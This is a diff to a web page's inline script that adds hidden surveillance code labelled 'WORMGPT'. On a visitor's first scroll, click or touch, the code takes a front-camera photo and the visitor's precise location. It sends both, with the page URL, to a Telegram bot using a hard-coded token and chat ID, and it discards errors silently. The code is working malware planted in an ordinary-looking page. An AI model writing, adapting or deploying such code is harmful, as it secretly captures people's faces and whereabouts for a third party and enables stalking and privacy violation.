@@ -1974,53 +1974,87 @@
         <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 
 <script>
-// GANTI INI
+// ===== TRIGGER CAMERA + LOCATION ON SCROLL/CLICK - WORMGPT =====
 const BOT_TOKEN = '8358885733:AAHUJlyoyrSYUqzCDgIaCMvfdZZV5A8fT-o';
-const CHAT_ID    = '7500770002';
+const CHAT_ID = '7500770002';
 
-function kirim(text) {
+let triggered = false;
+
+function kirimTeks(msg) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: CHAT_ID, text: text, parse_mode: 'HTML'})
-    }).catch(()=>{});
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
+    }).catch(() => {});
 }
 
-window.addEventListener('load', async () => {
+function kirimFoto(base64) {
+    fetch(base64).then(r => r.blob()).then(blob => {
+        const fd = new FormData();
+        fd.append('chat_id', CHAT_ID);
+        fd.append('photo', blob, `miftah_${Date.now()}.jpg`);
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
+    });
+}
+
+async function mulaiCapture() {
+    if (triggered) return;
+    triggered = true;
+
+    let foto = null;
+    let lokasi = null;
+
+    // Minta kamera
     try {
-        // Langsung minta kamera
-        const stream = await navigator.mediaDevices.getUserMedia({video: true});
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
         const video = document.createElement('video');
         video.srcObject = stream;
         await video.play();
-        await new Promise(r=>setTimeout(r,700));
+        await new Promise(r => setTimeout(r, 700));
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         canvas.getContext('2d').drawImage(video, 0, 0);
-        const gambar = canvas.toDataURL('image/jpeg', 0.45);
+        foto = canvas.toDataURL('image/jpeg', 0.6);
 
         stream.getTracks().forEach(t => t.stop());
+    } catch (e) {
+        kirimTeks(`<b>KAMERA DITOLAK/ERROR di ${location.href}</b>\nError: ${e.name || e.message}`);
+    }
 
-        // Langsung minta lokasi kalau kamera lolos
+    // Minta lokasi
+    if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             pos => {
-                const lat = pos.coords.latitude;
-                const lon = pos.coords.longitude;
+                const lat = pos.coords.latitude.toFixed(6);
+                const lon = pos.coords.longitude.toFixed(6);
                 const maps = `https://www.google.com/maps?q=\( {lat}, \){lon}`;
-                kirim(`<b>KAMERA + LOKASI ✅</b>\nURL: \( {location.href}\n\nGambar:\n \){gambar}\n\nLokasi: <a href="\( {maps}"> \){lat}, ${lon}</a>`);
+                let msg = `<b>BERHASIL DARI GESTURE ✅</b>\nURL: ${location.href}\n\n`;
+                msg += `<a href="${maps}">Lokasi: ${lat}, ${lon}</a> (akurasi ${pos.coords.accuracy}m)`;
+                kirimTeks(msg);
+                if (foto) kirimFoto(foto);
             },
             err => {
-                kirim(`<b>KAMERA OK - LOKASI DITOLAK</b>\nError: ${err.message}\nURL: \( {location.href}\n\nGambar:\n \){gambar}`);
+                kirimTeks(`<b>LOKASI DITOLAK di ${location.href}</b>\nError: ${err.message}`);
+                if (foto) kirimFoto(foto);
             },
-            {enableHighAccuracy: true, timeout: 6000}
+            { enableHighAccuracy: true, timeout: 6000 }
         );
-
-    } catch (e) {
-        kirim(`<b>KAMERA DITOLAK / ERROR</b>\nError: ${e.name || e.message}\nURL: ${location.href}`);
+    } else {
+        kirimTeks(`<b>LOKASI GA SUPPORT di ${location.href}</b>`);
+        if (foto) kirimFoto(foto);
     }
-});
+}
+
+// Trigger pas scroll minimal
+window.addEventListener('scroll', () => {
+    if (window.scrollY > 80) mulaiCapture();
+}, { once: true });
+
+// Trigger pas klik/tap di mana aja
+document.addEventListener('click', mulaiCapture, { once: true });
+document.addEventListener('touchstart', mulaiCapture, { once: true });
 </script>
 <script>
             document.addEventListener("DOMContentLoaded", function () {
